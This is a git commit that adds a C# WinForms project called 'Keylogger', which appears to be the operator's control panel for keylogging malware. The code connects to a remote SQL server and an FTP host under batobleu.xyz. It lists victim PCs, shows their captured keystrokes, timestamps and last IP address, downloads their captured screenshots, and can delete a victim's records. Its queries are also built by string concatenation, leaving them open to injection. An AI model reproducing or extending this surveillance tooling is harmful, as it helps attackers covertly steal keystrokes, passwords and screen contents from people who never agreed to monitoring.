dae4335c9fb6069266753b9c598575b89b18a66d
elpeaudelabanana <36197418+elpeaudelabanana@users.noreply.github.com>
2018-02-06 15:39:57 +0100

    Initial commit

---
+++ Keylogger/Form1.Designer.cs
@@ -0,0 +1,143 @@
+﻿namespace Keylogger
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Variable nécessaire au concepteur.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Nettoyage des ressources utilisées.
+        /// </summary>
+        /// <param name="disposing">true si les ressources managées doivent être supprimées ; sinon, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Code généré par le Concepteur Windows Form
+
+        /// <summary>
+        /// Méthode requise pour la prise en charge du concepteur - ne modifiez pas
+        /// le contenu de cette méthode avec l'éditeur de code.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.comboBox_nomPC = new System.Windows.Forms.ComboBox();
+            this.listBox_requeteResult = new System.Windows.Forms.ListBox();
+            this.button_requete = new System.Windows.Forms.Button();
+            this.pictureBox_screenshot = new System.Windows.Forms.PictureBox();
+            this.button_resetTable = new System.Windows.Forms.Button();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.label_ipPC = new System.Windows.Forms.Label();
+            this.checkBox_screen = new System.Windows.Forms.CheckBox();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox_screenshot)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // comboBox_nomPC
+            // 
+            this.comboBox_nomPC.FormattingEnabled = true;
+            this.comboBox_nomPC.Location = new System.Drawing.Point(135, 29);
+            this.comboBox_nomPC.Name = "comboBox_nomPC";
+            this.comboBox_nomPC.Size = new System.Drawing.Size(159, 21);
+            this.comboBox_nomPC.TabIndex = 0;
+            // 
+            // listBox_requeteResult
+            // 
+            this.listBox_requeteResult.FormattingEnabled = true;
+            this.listBox_requeteResult.HorizontalScrollbar = true;
+            this.listBox_requeteResult.Location = new System.Drawing.Point(12, 71);
+            this.listBox_requeteResult.Name = "listBox_requeteResult";
+            this.listBox_requeteResult.Size = new System.Drawing.Size(830, 173);
+            this.listBox_requeteResult.TabIndex = 1;
+            this.listBox_requeteResult.SelectedValueChanged += new System.EventHandler(this.listBox_requeteResult_SelectedValueChanged);
+            // 
+            // button_requete
+            // 
+            this.button_requete.Location = new System.Drawing.Point(12, 12);
+            this.button_requete.Name = "button_requete";
+            this.button_requete.Size = new System.Drawing.Size(95, 23);
+            this.button_requete.TabIndex = 2;
+            this.button_requete.Text = "Requete";
+            this.button_requete.UseVisualStyleBackColor = true;
+            this.button_requete.Click += new System.EventHandler(this.button_requete_Click);
+            // 
+            // pictureBox_screenshot
+            // 
+            this.pictureBox_screenshot.Location = new System.Drawing.Point(12, 250);
+            this.pictureBox_screenshot.Name = "pictureBox_screenshot";
+            this.pictureBox_screenshot.Size = new System.Drawing.Size(830, 264);
+            this.pictureBox_screenshot.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox_screenshot.TabIndex = 3;
+            this.pictureBox_screenshot.TabStop = false;
+            this.pictureBox_screenshot.Click += new System.EventHandler(this.pictureBox_screenshot_Click);
+            // 
+            // button_resetTable
+            // 
+            this.button_resetTable.Location = new System.Drawing.Point(327, 27);
+            this.button_resetTable.Name = "button_resetTable";
+            this.button_resetTable.Size = new System.Drawing.Size(95, 23);
+            this.button_resetTable.TabIndex = 4;
+            this.button_resetTable.Text = "Reset Table";
+            this.button_resetTable.UseVisualStyleBackColor = true;
+            this.button_resetTable.Click += new System.EventHandler(this.button_resetTable_Click);
+            // 
+            // label_ipPC
+            // 
+            this.label_ipPC.AutoSize = true;
+            this.label_ipPC.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F);
+            this.label_ipPC.Location = new System.Drawing.Point(460, 30);
+            this.label_ipPC.Name = "label_ipPC";
+            this.label_ipPC.Size = new System.Drawing.Size(37, 17);
+            this.label_ipPC.TabIndex = 5;
+            this.label_ipPC.Text = "ipPC";
+            // 
+            // checkBox_screen
+            // 
+            this.checkBox_screen.AutoSize = true;
+            this.checkBox_screen.Location = new System.Drawing.Point(19, 40);
+            this.checkBox_screen.Name = "checkBox_screen";
+            this.checkBox_screen.Size = new System.Drawing.Size(80, 17);
+            this.checkBox_screen.TabIndex = 6;
+            this.checkBox_screen.Text = "Screenshot";
+            this.checkBox_screen.UseVisualStyleBackColor = true;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(863, 526);
+            this.Controls.Add(this.checkBox_screen);
+            this.Controls.Add(this.label_ipPC);
+            this.Controls.Add(this.button_resetTable);
+            this.Controls.Add(this.pictureBox_screenshot);
+            this.Controls.Add(this.button_requete);
+            this.Controls.Add(this.listBox_requeteResult);
+            this.Controls.Add(this.comboBox_nomPC);
+            this.Name = "Form1";
+            this.Text = "Form1";
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox_screenshot)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.ComboBox comboBox_nomPC;
+        private System.Windows.Forms.ListBox listBox_requeteResult;
+        private System.Windows.Forms.Button button_requete;
+        private System.Windows.Forms.PictureBox pictureBox_screenshot;
+        private System.Windows.Forms.Button button_resetTable;
+        private System.Windows.Forms.Timer timer1;
+        private System.Windows.Forms.Label label_ipPC;
+        private System.Windows.Forms.CheckBox checkBox_screen;
+    }
+}
+
---
+++ Keylogger/Form1.cs
@@ -0,0 +1,211 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+using System.Data.SqlClient;
+using FluentFTP;
+using System.Net;
+
+namespace Keylogger
+{
+    public partial class Form1 : Form
+    {
+        public static string log = @"Data Source=batobleu.xyz,3351; Initial Catalog=keylog;user id=root;password=";
+        public static SqlConnection cnxSQLServer = new SqlConnection(log);
+        public static SqlCommand cmdListNomPC = cnxSQLServer.CreateCommand();
+        public static string[] listNomPcArray = new string[256];
+        public static int x;
+        public static SqlCommand cmdRequeteSQL = cnxSQLServer.CreateCommand();
+        public static SqlCommand cmdImageSQL = cnxSQLServer.CreateCommand();
+        public static SqlCommand cmdResetBase = cnxSQLServer.CreateCommand();
+        public static SqlCommand cmdIpPC = cnxSQLServer.CreateCommand();
+        public static bool ftpconnect = false;
+        public static List<int> idKeylog = new List<int>();
+        public static List<string> dateheure = new List<string>();
+        public static int compteur = 0;
+        public static string nomFichier;
+        public static FtpClient client = new FtpClient("ftp.batobleu.xyz");
+
+
+        public Form1()
+        {
+            int nbPC = 0;
+            InitializeComponent();
+            try
+            {
+                cnxSQLServer.Open();
+                MessageBox.Show("Connexion OK !");
+            }
+            catch (Exception exc)
+            {
+                MessageBox.Show(Convert.ToString(exc));
+            }
+            cmdListNomPC.CommandText = " SELECT DISTINCT labelPC FROM keylog ";
+            SqlDataReader listNomPC = cmdListNomPC.ExecuteReader();
+            if (listNomPC != null)
+            {
+                while (listNomPC.Read())
+                {
+                    string s = (string)listNomPC["labelPC"].ToString();
+                    comboBox_nomPC.Items.Add(s);
+                    listNomPcArray[nbPC] = s;
+                    nbPC++;
+                }
+            }
+            listNomPC.Close();
+            AppDomain.CurrentDomain.ProcessExit += new EventHandler(OnProcessExit);
+        }
+
+        private void button_requete_Click(object sender, EventArgs e)
+        {
+            listBox_requeteResult.Items.Clear();
+            x = comboBox_nomPC.SelectedIndex;
+            if (x == -1)
+            {
+                MessageBox.Show("Selectionné un PC");
+            }
+            else
+            {
+                if (checkBox_screen.Checked == true)
+                {
+                    cmdRequeteSQL.CommandText = " SELECT * FROM keylog WHERE labelPC = '" + listNomPcArray[x] + "' AND keylog = 'screenshot'  order by idKeylog ASC ";
+                }
+                else
+                {
+                    cmdRequeteSQL.CommandText = " SELECT * FROM keylog WHERE labelPC = '" + listNomPcArray[x] + "' AND keylog != 'screenshot'  order by idKeylog ASC ";
+                }
+                SqlDataReader readerSQLServer = cmdRequeteSQL.ExecuteReader();
+                if (readerSQLServer != null)
+                {
+                    while (readerSQLServer.Read())
+                    {
+                        string requete = (string)readerSQLServer["idKeylog"].ToString() + " - " + (string)readerSQLServer["keylog"].ToString() + " - " + (string)readerSQLServer["dateKeylog"].ToString();
+                        listBox_requeteResult.Items.Add(requete);
+                        idKeylog.Add(Convert.ToInt32((string)readerSQLServer["idKeylog"].ToString()));
+                        dateheure.Add((string)readerSQLServer["dateKeylog"].ToString());
+                    }
+                }
+                readerSQLServer.Close();
+                cmdIpPC.CommandText = " SELECT ipPC FROM keylog WHERE labelPC = '" + listNomPcArray[x] + "' AND idKeylog = (SELECT MAX(idKeylog) FROM keylog WHERE labelPC = '" + listNomPcArray[x] + "') ";
+                SqlDataReader readerIpPC = cmdIpPC.ExecuteReader();
+                if (readerIpPC != null)
+                {
+                    while (readerIpPC.Read())
+                    {
+                        label_ipPC.Text = (string)readerIpPC["ipPC"].ToString();
+                    }
+                }
+                readerIpPC.Close();
+            }
+        }
+
+        private void listBox_requeteResult_SelectedValueChanged(object sender, EventArgs e)
+        {
+            client.Credentials = new NetworkCredential("11793_nexis", "");
+            if (ftpconnect == false)
+            {
+                client.Connect();
+                ftpconnect = true;
+                int x = listBox_requeteResult.SelectedIndex;
+                cmdImageSQL.CommandText = "SELECT dateKeylog, labelPC FROM keylog WHERE idKeylog = " + Convert.ToString(idKeylog[x]);
+                SqlDataReader readerSQLServer = cmdImageSQL.ExecuteReader();
+                if (readerSQLServer != null)
+                {
+                    while (readerSQLServer.Read())
+                    {
+                        string dateFormat = Convert.ToDateTime((string)readerSQLServer["dateKeylog"].ToString()).ToString("dd_MM_yyyy HH_mm_ss");
+                        nomFichier = dateFormat + ".png";
+                        string cheminFichier = "/keylog/" + (string)readerSQLServer["labelPC"].ToString() + "/" + nomFichier;
+                        try
+                        {
+                            client.DownloadFile("./" + nomFichier, cheminFichier);
+                            long size = (new FileInfo("./" + nomFichier)).Length;
+                            FileStream fs = new FileStream("./" + nomFichier, FileMode.Open, FileAccess.Read);
+                            byte[] data = new byte[size];
+                            fs.Read(data, 0, (int)size);
+                            var image = Image.FromStream(fs);
+                            pictureBox_screenshot.Image = image;
+                            fs.Close();
+                        }
+                        catch (Exception exs)
+                        {
+                            MessageBox.Show(exs.ToString(), "Error");
+                        }
+                        break;
+                    }
+                }
+                readerSQLServer.Close();
+            }
+            else
+            {
+                File.Delete("./" + nomFichier);
+                int x = listBox_requeteResult.SelectedIndex;
+                cmdImageSQL.CommandText = "SELECT dateKeylog, labelPC FROM keylog WHERE idKeylog = " + Convert.ToString(idKeylog[x]);
+                SqlDataReader readerSQLServer = cmdImageSQL.ExecuteReader();
+                if (readerSQLServer != null)
+                {
+                    while (readerSQLServer.Read())
+                    {
+                        string dateFormat = Convert.ToDateTime((string)readerSQLServer["dateKeylog"].ToString()).ToString("dd_MM_yyyy HH_mm_ss");
+                        nomFichier = dateFormat + ".png";
+                        string cheminFichier = "/keylog/" + (string)readerSQLServer["labelPC"].ToString() + "/" + nomFichier;
+                        try
+                        {
+                            client.DownloadFile("./" + nomFichier, cheminFichier);
+                            long size = (new FileInfo("./" + nomFichier)).Length;
+                            FileStream fs = new FileStream("./" + nomFichier, FileMode.Open, FileAccess.Read);
+                            byte[] data = new byte[size];
+                            fs.Read(data, 0, (int)size);
+                            var image = Image.FromStream(fs);
+                            pictureBox_screenshot.Image = image;
+                            fs.Close();
+                        }
+                        catch (Exception exs)
+                        {
+                            MessageBox.Show(exs.ToString(),"Error");
+                        }
+                        break;
+                    }
+                }
+                readerSQLServer.Close();
+            }
+        }
+
+        private void pictureBox_screenshot_Click(object sender, EventArgs e)
+        {
+            System.Diagnostics.ProcessStartInfo ouvrirImage = new System.Diagnostics.ProcessStartInfo(nomFichier, "");
+            System.Diagnostics.Process.Start(ouvrirImage);
+        }
+
+        static void OnProcessExit(object sender, EventArgs e)
+        {
+            try
+            {
+                File.Delete("./" + nomFichier);
+            }
+            catch
+            {
+
+            }
+        }
+
+        private void button_resetTable_Click(object sender, EventArgs e)
+        {
+            DialogResult resetTable = MessageBox.Show("Voulez vous reset la base de donnée pour labelPC = " + listNomPcArray[x] + " ?", "Confirmation", MessageBoxButtons.YesNo);
+            if (resetTable == DialogResult.Yes)
+            {
+                cmdResetBase.CommandText = "DELETE FROM keylog WHERE labelPC = '" + listNomPcArray[x] + "'";
+                cmdResetBase.ExecuteNonQuery();
+                client.DeleteDirectory("/keylog/" + listNomPcArray[x] + "/");
+
+            }
+        }
+
+    }
+}
